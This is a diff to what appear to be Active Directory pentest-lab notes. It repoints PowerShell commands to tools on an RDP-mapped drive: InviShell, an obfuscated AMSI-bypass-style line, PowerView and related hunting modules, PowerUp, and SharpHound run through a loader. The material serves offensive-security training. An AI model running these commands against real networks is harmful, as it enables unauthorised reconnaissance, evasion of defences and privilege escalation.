@@ -1,5 +1,7 @@
 ```powershell
-InviShell\RunWithRegistryNonAdmin.bat
+net use A: \\TSCLIENT\Tools
+
+A:\tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 
 ```powershell
@@ -7,7 +9,7 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) (
 ```
 
 ```powershell
-Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\Invoke-SessionHunter.ps1, .\PowerUp.ps1
+Import-Module A:\tools\PowerView.ps1, A:\tools\PowerHuntShares.psm1, A:\tools\Find-PSRemotingLocalAdminAccess.ps1, A:\tools\Invoke-SessionHunter.ps1, A:\tools\PowerUp.ps1
 ```
 
 ```powershell
@@ -15,7 +17,7 @@ Find-PSRemotingLocalAdminAccess
 ```
 
 ```powershell
-.\Loader.exe -Path SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs --zipfilename shout
+A:\tools\Loader.exe -Path A:\tools\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs --zipfilename shout
 ```
 
 **REVIEW WHAT PRIVILEGES A USER HAS AFTER COMPROMISE**
